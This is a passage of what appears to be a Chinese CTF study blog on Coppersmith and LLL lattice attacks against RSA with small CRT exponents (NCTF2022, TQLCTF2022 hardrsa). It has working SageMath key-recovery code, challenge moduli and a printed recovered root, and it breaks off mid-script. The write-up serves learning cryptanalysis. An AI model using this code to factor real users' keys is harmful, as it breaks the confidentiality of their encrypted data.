class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apply_lll</span>(<span class="params">m1</span>):</span></span><br><span class="line">res = [<span class="built_in">list</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(matrix(m1).LLL())]</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Constants</span></span><br><span class="line">N = <span class="number">46460689902575048279161539093139053273250982188789759171230908555090160106327807756487900897740490796014969642060056990508471087779067462081114448719679327369541067729981885255300592872671988346475325995092962738965896736368697583900712284371907712064418651214952734758901159623911897535752629528660173915950061002261166886570439532126725549551049553283657572371862952889353720425849620358298698866457175871272471601283362171894621323579951733131854384743239593412466073072503584984921309839753877025782543099455341475959367025872013881148312157566181277676442222870964055594445667126205022956832633966895316347447629237589431514145252979687902346011013570026217</span></span><br><span class="line">e = <span class="number">13434798417717858802026218632686207646223656240227697459980291922185309256011429515560448846041054116798365376951158576013804627995117567639828607945684892331883636455939205318959165789619155365126516341843169010302438723082730550475978469762351865223932725867052322338651961040599801535197295746795446117201188049551816781609022917473182830824520936213586449114671331226615141179790307404380127774877066477999810164841181390305630968947277581725499758683351449811465832169178971151480364901867866015038054230812376656325631746825977860786943183283933736859324046135782895247486993035483349299820810262347942996232311978102312075736176752844163698997988956692449</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="comment"># Calculate needed values</span></span><br><span class="line"><span class="comment"># num_variables = 2</span></span><br><span class="line">alpha = log(e, N)</span><br><span class="line">beta = <span class="number">0.4090</span></span><br><span class="line">delta = <span class="number">50</span>/<span class="number">2200</span></span><br><span class="line"><span class="comment"># Bounded by values</span></span><br><span class="line"><span class="comment"># ceil(2 * N^(alpha + beta + delta - 1))</span></span><br><span class="line">X_p = ceil(<span class="number">2</span> * N^(alpha + beta + delta - <span class="number">1</span>))</span><br><span class="line">X_q = ceil(<span class="number">2</span> * N^(alpha + beta + delta - <span class="number">1</span>))</span><br><span class="line">Y_p = ceil(<span class="number">2</span>*N^beta)</span><br><span class="line">Y_q = ceil(<span class="number">2</span>*N^(<span class="number">1</span>-beta))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;alpha:&#x27;</span>, alpha)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;beta:&#x27;</span>, beta)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;delta:&#x27;</span>, delta)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;X_p, X_q:&#x27;</span>, X_p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Y_p:&#x27;</span>, Y_p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Y_q:&#x27;</span>, Y_q)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create matrix</span></span><br><span class="line">constants = [<span class="number">1</span>, X_p, X_p*Y_p, Y_p, X_p*Y_p**<span class="number">2</span>, X_q*Y_q]</span><br><span class="line">variables = [<span class="number">1</span>, x, x*y, y, x*y**<span class="number">2</span>, a*b]</span><br><span class="line">mat = [</span><br><span class="line">[e, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, e, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[N, N, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, e, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, N, N, -<span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(constants)):</span><br><span class="line">mat[i][j] *= constants[j]</span><br><span class="line">mat = apply_lll(mat)</span><br><span class="line"><span class="comment"># print(mat)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove constants</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(constants)):</span><br><span class="line"><span class="keyword">assert</span>(mat[i][j] % constants[j] == <span class="number">0</span>)</span><br><span class="line">mat[i][j] //= constants[j]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate equations</span></span><br><span class="line">equations = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat)):</span><br><span class="line">equation = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(variables)):</span><br><span class="line">equation += mat[i][j] * variables[j]</span><br><span class="line">equations.append(equation)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># Try with these equations</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len(equations) =&quot;</span>, <span class="built_in">len</span>(equations))</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> combinations(equations, <span class="number">2</span>):</span><br><span class="line">solve_equations(each)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h4 id="NCTF2022-官方题解"><a href="#NCTF2022-官方题解" class="headerlink" title="NCTF2022 官方题解"></a>NCTF2022 官方题解</h4><p>还是官方题解给力，完美实现了06年的0.468</p><p>梦回Way to Crypto，也小测了波，beta大于0.4090就不是很稳定了，但beta向下兼容倒是挺稳定的</p><p>实际代码编写以及思路上的困惑如下：</p><ul><li><p>m如果是自己设置的话，t的定义在哪？</p><p>(在<strong>Proof</strong>以及<strong>Lemma</strong>中仔细找，能找到)</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20230221140714912.png" alt="t&amp;s"></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20230221140809159.png" alt="τ&amp;σ"></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20230221141134422.png" alt="abc"></p><p>以及其他参数X、Y、Z</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20230221141553960.png" alt="XYZ"></p></li><li><p>下三角矩阵构造如何构造？</p></li><li><p>最后求解为什么不用结式，用了Ideal？</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"><span class="comment"># https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf</span></span><br><span class="line"><span class="comment"># Author: ZM__________J, To1in</span></span><br><span class="line">N = <span class="number">46460689902575048279161539093139053273250982188789759171230908555090160106327807756487900897740490796014969642060056990508471087779067462081114448719679327369541067729981885255300592872671988346475325995092962738965896736368697583900712284371907712064418651214952734758901159623911897535752629528660173915950061002261166886570439532126725549551049553283657572371862952889353720425849620358298698866457175871272471601283362171894621323579951733131854384743239593412466073072503584984921309839753877025782543099455341475959367025872013881148312157566181277676442222870964055594445667126205022956832633966895316347447629237589431514145252979687902346011013570026217</span></span><br><span class="line">e = <span class="number">13434798417717858802026218632686207646223656240227697459980291922185309256011429515560448846041054116798365376951158576013804627995117567639828607945684892331883636455939205318959165789619155365126516341843169010302438723082730550475978469762351865223932725867052322338651961040599801535197295746795446117201188049551816781609022917473182830824520936213586449114671331226615141179790307404380127774877066477999810164841181390305630968947277581725499758683351449811465832169178971151480364901867866015038054230812376656325631746825977860786943183283933736859324046135782895247486993035483349299820810262347942996232311978102312075736176752844163698997988956692449</span></span><br><span class="line">alpha = log(e, N)</span><br><span class="line">beta = <span class="number">0.4090</span></span><br><span class="line">delta = <span class="number">50</span>/<span class="number">2200</span></span><br><span class="line">P.&lt;x,y,z&gt;=PolynomialRing(ZZ)</span><br><span class="line"> </span><br><span class="line">X = ceil(<span class="number">2</span> * N^(alpha + beta + delta - <span class="number">1</span>))</span><br><span class="line">Y = ceil(N^beta)</span><br><span class="line"><span class="comment"># Y = ceil(2 * N^beta)</span></span><br><span class="line">Z = ceil(<span class="number">2</span> * N^(<span class="number">1</span> - beta))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x*(N-y)+N</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换多项式：利用yz=N, 降低f(x, y, z)中y的幂次</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">f</span>):</span></span><br><span class="line">    my_tuples = f.exponents(as_ETuples=<span class="literal">False</span>)  <span class="comment"># 取每个单项式x、y、z的指数</span></span><br><span class="line">    g = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> my_tuple <span class="keyword">in</span> my_tuples:</span><br><span class="line">        exponent = <span class="built_in">list</span>(my_tuple)</span><br><span class="line">        mon = x ^ exponent[<span class="number">0</span>] * y ^ exponent[<span class="number">1</span>] * z ^ exponent[<span class="number">2</span>]</span><br><span class="line">        tmp = f.monomial_coefficient(mon)  <span class="comment"># 取原系数</span></span><br><span class="line">        </span><br><span class="line">        my_minus = <span class="built_in">min</span>(exponent[<span class="number">1</span>], exponent[<span class="number">2</span>])</span><br><span class="line">        exponent[<span class="number">1</span>] -= my_minus</span><br><span class="line">        exponent[<span class="number">2</span>] -= my_minus</span><br><span class="line">        tmp *= N^my_minus  <span class="comment"># 改系数</span></span><br><span class="line">        tmp *= x ^ exponent[<span class="number">0</span>] * y ^ exponent[<span class="number">1</span>] * z ^ exponent[<span class="number">2</span>]</span><br><span class="line">        </span><br><span class="line">        g += tmp</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 各参数 </span></span><br><span class="line">m = <span class="number">5</span> <span class="comment"># need to be adjusted according to different situations</span></span><br><span class="line">tau = ((<span class="number">1</span> - beta)^<span class="number">2</span> - delta) / (<span class="number">2</span> * beta * (<span class="number">1</span> - beta))</span><br><span class="line">sigma = (<span class="number">1</span> - beta - delta) / (<span class="number">2</span> * (<span class="number">1</span> - beta))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(sigma * m)</span><br><span class="line"><span class="built_in">print</span>(tau * m)</span><br><span class="line"></span><br><span class="line">s = ceil(sigma * m)</span><br><span class="line">t = ceil(tau * m)</span><br><span class="line">my_polynomials = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成shift多项式</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m-i+<span class="number">1</span>):</span><br><span class="line">        g_ij = trans(e^(m-i) * x^j * z^s * f(x, y)^i)</span><br><span class="line">        my_polynomials.append(g_ij)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t+<span class="number">1</span>):</span><br><span class="line">        h_ij = trans(e^(m-i) * y^j * z^s * f(x, y)^i)</span><br><span class="line">        my_polynomials.append(h_ij)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment"># 构造下三角矩阵：利用偏序</span></span><br><span class="line">known_set = <span class="built_in">set</span>()</span><br><span class="line">new_polynomials = []</span><br><span class="line">my_monomials = []</span><br><span class="line"> </span><br><span class="line"><span class="comment"># construct partial order</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(my_polynomials) &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(my_polynomials)):</span><br><span class="line">        f = my_polynomials[i]</span><br><span class="line">        current_monomial_set = <span class="built_in">set</span>(x^tx * y^ty * z^tz <span class="keyword">for</span> tx, ty, tz <span class="keyword">in</span> f.exponents(as_ETuples=<span class="literal">False</span>))</span><br><span class="line">        delta_set = current_monomial_set - known_set</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(delta_set) == <span class="number">1</span>:</span><br><span class="line">            new_monomial = <span class="built_in">list</span>(delta_set)[<span class="number">0</span>]</span><br><span class="line">            my_monomials.append(new_monomial)</span><br><span class="line">            known_set |= current_monomial_set</span><br><span class="line">            new_polynomials.append(f)            </span><br><span class="line">            my_polynomials.pop(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;GG&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">my_polynomials = deepcopy(new_polynomials)</span><br><span class="line"> </span><br><span class="line">nrows = <span class="built_in">len</span>(my_polynomials)</span><br><span class="line">ncols = <span class="built_in">len</span>(my_monomials)</span><br><span class="line">L = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows)]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    g_scale = my_polynomials[i](X * x, Y * y, Z * z)  <span class="comment"># 代入X、Y、Z</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        L[i][j] = g_scale.monomial_coefficient(my_monomials[j])</span><br><span class="line">        </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 降低矩阵行列式大小： remove N^j</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    Lii = L[i][i]</span><br><span class="line">    N_Power = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (Lii % N == <span class="number">0</span>):</span><br><span class="line">        N_Power *= N</span><br><span class="line">        Lii //= N</span><br><span class="line">    L[i][i] = Lii</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        <span class="keyword">if</span> (j != i):</span><br><span class="line">            L[i][j] = (L[i][j] * inverse_mod(N_Power, e^m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># LLL得到规约系数，联立解方程            </span></span><br><span class="line">L = Matrix(ZZ, L)</span><br><span class="line">nrows = L.nrows()</span><br><span class="line">L = L.LLL()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Recover poly</span></span><br><span class="line">reduced_polynomials = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    g_l = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        g_l += L[i][j] // my_monomials[j](X, Y, Z) * my_monomials[j]  <span class="comment"># 消常系数，代入未知量</span></span><br><span class="line">    reduced_polynomials.append(g_l)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># eliminate z： use of y*z=N</span></span><br><span class="line">my_ideal_list = [y * z - N] + reduced_polynomials</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Variety（为什么需要那么多🤔？不是前三个就够了吗，试了下解起来好慢，没结果）</span></span><br><span class="line">my_ideal_list = [Hi.change_ring(QQ) <span class="keyword">for</span> Hi <span class="keyword">in</span> my_ideal_list]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(my_ideal_list),<span class="number">3</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    V = Ideal(my_ideal_list[:i]).variety(ring=ZZ)</span><br><span class="line">    <span class="built_in">print</span>(V)</span><br><span class="line"><span class="comment">#[&#123;z: 12802692475349485610473781287027553390253771106432654573503896144916729600503566568750388778199186889792482907407718147190530044920232683163941552482789952714283570754056433670735303357508451647073211371989388879428065367142825533019883798121260838408498282273223302509241229258595176130544371781524298142815099491753819782913040582455136982147010841337850805642005577584947943848348285516563, y: 3628978044425516256252147348112819551863749940058657194357489608704171827031473111609089635738827298682760802716155197142949509565102167059366421892847010862457650295837231017990389942425249509044223464186611269388650172307612888367710149054996350799445205007925937223059, x: 405726385819346439624373295724174904587513703028810607887196207245590677314635812068207279608967556024765942887396159920943510998058855747055443081960935792673829634461468743022155648395228589917369402664408573172965003110508338065148371590644205978916495280169653332814813227881426466&#125;]</span></span><br></pre></td></tr></table></figure><h3 id="TQLCTF2022·hardrsa"><a href="#TQLCTF2022·hardrsa" class="headerlink" title="TQLCTF2022·hardrsa"></a>TQLCTF2022·hardrsa</h3><p>去github搜论文名，找到hash师傅<a href="https://github.com/hash-hash/ctf/blob/main/Crypto/Writeup/Other/hardrsa.md">复现TQLCTF的exp</a>，学习之</p><h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><p>对于 $p &lt; N^{0.468}$ ，有：</p><p>相关参数 $e=N^\alpha,p=N^\beta,d_q=N^\delta$</p><p>由条件有 $ed_q=1+k(q-1)$</p><p>构造多项式 $f_q(x_q,y_q)=1+x_q(y_q-1)=0(mod~e)$</p><p>两边同乘p我们有 $ed_pp=p+k(N-p)=N+(k-1)(N-p)$</p><p>构造多项式 $f_p(x_p,y_p)=N+x_p(N-y_p)=0(mod~e)$</p><p><strong>各变量的Bound</strong></p><p>$X_p=N^{\alpha+\beta+\delta-1},X_q=N^{\alpha+\beta+\delta-1},Y_p=N^{\beta},Y_q=N^{1-\beta}$</p><p>计算 $\tau_p=\frac{1-2\beta-\delta}{2\beta},\tau_q=\frac{1-\beta-\delta}{1-\beta}$</p><p><strong>构造划分</strong></p><p>$S_1=\{i=0,…,m;j=0,…,m-i\}$</p><p>$S_2=\{i=0,…,m;j=1,…,\lceil\tau_pm\rceil\}$</p><p>$S_3=\{i=1,…,m;j=1,…,\lceil\tau_qi\rceil\}$</p><p><strong>shift多项式定义</strong></p><p>$g_{1[i,j]}(x_p,y_p)=x_p^jf_p^i(x_p,y_p)e^{m-i}$</p><p>$g_{2[i,j]}(x_p,y_p)=y_p^jf_p^i(x_p,y_p)e^{m-i}$</p><p>$g_{3[i,j]}(x_p,x_q,y_p,y_q)=f_p^{i-j}(x_p,y_p)f_q^j(x_q,y_q)e^{m-i}$</p><p>可将四元简化为两元来降低求根的难度</p><p>过了一遍代码，Copper的构造清晰了不少</p><p>也因为缺失<code>poly_gcd.py</code>，便学习了多元copper仓库的<a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage">boneh_durfee</a>代码，实现了结式求解。</p><p>再借鉴boneh_durfee代码，对原代码做如下更改</p><ul><li><p>LLL规约结果筛选</p></li><li><p><a href="http://www2.math.ritsumei.ac.jp/doc/static/reference/polynomial_rings/sage/rings/polynomial/multi_polynomial_element.html">结式</a>求解</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成多项式：整除常系数，代入未知数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpoly</span>(<span class="params">coe,mon</span>):</span></span><br><span class="line">    h=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> idx,monomial <span class="keyword">in</span> <span class="built_in">enumerate</span>(mon):</span><br><span class="line">        h+=coe[idx]//monomial(Xp,Yp)*monomial</span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line">N=<span class="number">17898692915537057253027340409848777379525990043216176404521845629792286203459681133425615460580210961931628383718238208402935069434512008997422795968676635886265184398587211149645171148089263697198308448184434844310802022336492929706736607458307830462086477073132852687216229392067680807130235274969547247389</span></span><br><span class="line">e=<span class="number">7545551830675702855400776411651853827548700298411139797799936263327967930532764763078562198672340967918924251144028131553633521880515798926665667805615808959981427173796925381781834763784420392535231864547193756385722359555841096299828227134582178397639173696868619386281360614726834658925680670513451826507</span></span><br><span class="line">c=<span class="number">2031772143331409088299956894510278261053644235222590973258899052809440238898925631603059180509792948749674390704473123551866909789808259315538758248037806795516031585011977710042943997673076463232373915245996143847637737207984866535157697240588441997103830717158181959653034344529914097609427019775229834115</span></span><br><span class="line"></span><br><span class="line">alpha = <span class="number">1</span></span><br><span class="line">beta = <span class="number">0.233</span></span><br><span class="line">delta = <span class="number">0.226</span></span><br><span class="line">Xp=<span class="built_in">int</span>(RR(N)^(alpha+beta+delta-<span class="number">1</span>))</span><br><span class="line">Yp=<span class="built_in">int</span>(RR(N)^beta)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tp=(<span class="number">1</span>-<span class="number">2</span>*beta-delta)/(<span class="number">2</span>*beta)</span><br><span class="line">tq=(<span class="number">1</span>-beta-delta)/(<span class="number">1</span>-beta)</span><br><span class="line">m=<span class="number">5</span></span><br><span class="line"></span><br><span class="line">PR.&lt;xp,yp&gt;=PolynomialRing(ZZ)</span><br><span class="line">fq=yp+(xp+<span class="number">1</span>)*(N-yp)  <span class="comment"># 将fq转换为关于yp、xp的函数：同乘yp，将fq转换为yp的函数且xq=xp+1</span></span><br><span class="line">fp=N+xp*(N-yp)</span><br><span class="line"></span><br><span class="line">poly=[]</span><br><span class="line">monomials=<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造划分</span></span><br><span class="line">S1=[(i,j) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m-i+<span class="number">1</span>)]</span><br><span class="line">S2=[(i,j) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">int</span>(tp*m)+<span class="number">1</span>)]</span><br><span class="line">S3=[(i,j) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,m+<span class="number">1</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">int</span>(tq*i)+<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成shift多项式</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> S1:</span><br><span class="line">    i,j=item</span><br><span class="line">    g=xp^j*fp^i*e^(m-i)</span><br><span class="line">    poly.append(g)</span><br><span class="line">    <span class="keyword">for</span> mono <span class="keyword">in</span> g.monomials():</span><br><span class="line">        monomials.add(mono)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> S2:</span><br><span class="line">    i,j=item</span><br><span class="line">    